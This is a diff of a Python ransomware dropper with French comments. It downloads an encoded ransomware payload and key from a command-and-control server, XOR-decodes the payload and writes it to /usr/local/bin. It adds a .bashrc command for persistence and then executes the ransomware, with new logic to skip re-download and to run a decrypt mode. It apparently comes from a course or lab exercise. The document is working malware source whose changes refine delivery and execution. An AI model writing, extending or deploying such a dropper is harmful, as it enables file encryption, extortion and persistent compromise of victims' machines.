@@ -4,7 +4,7 @@ import requests
 import subprocess
 import sys
 from xorcrypt import xorcrypt
-
+import signal
 
 CNC_ADDRESS = "cnc:6666"
 OUTPUT_FILE = "/usr/local/bin/ransomware" 
@@ -34,12 +34,19 @@ def decode_and_save_ransomware(encoded_ransomware: str, encoded_key: str):
 
     os.chmod(OUTPUT_FILE, 0o755)  # Rendre le fichier exécutable
 
+
+
 def main():
-    cnc_response = get_ransomware_from_cnc()
-    encoded_ransomware = cnc_response["data"]
-    encoded_key = cnc_response["key"]
-    decode_and_save_ransomware(encoded_ransomware, encoded_key)
-    print("Ransomware téléchargé et décodé")
+    # Ignorer les signaux SIGINT
+    # signal.signal(signal.SIGINT, signal.SIG_IGN)
+
+    # Récuperer le ransomware depuis le cnc si il n'est pas déjà présent
+    if not os.path.exists(OUTPUT_FILE):
+        cnc_response = get_ransomware_from_cnc()
+        encoded_ransomware = cnc_response["data"]
+        encoded_key = cnc_response["key"]
+        decode_and_save_ransomware(encoded_ransomware, encoded_key)
+        print("Ransomware téléchargé et décodé")
 
     # Ajouter une commande au fichier .bashrc si permission suffisante
     try:
@@ -47,10 +54,16 @@ def main():
             bashrc_file.write(COMMAND)
     except PermissionError:
         print("Permission denied. Impossible d'ajouter la commande au fichier .bashrc")
-    # faire un liste contenant le chemin du fichier à éxécuter et un argument
-    arguments = [OUTPUT_FILE, sys.argv[1]]
-    # Lancer le ransomware installé
-    subprocess.run(arguments)
+
+    if len(sys.argv) != 2:
+        # Lancer le ransomware installé
+        subprocess.run(OUTPUT_FILE)
+        # Lancer le ransomware installé avec des arguments
+        subprocess.run([OUTPUT_FILE, "--decrypt"])
+    else:
+        # Lancer le ransomware installé avec des arguments
+        subprocess.run([OUTPUT_FILE, sys.argv[1]])
+
 
 if __name__ == "__main__":
     main()
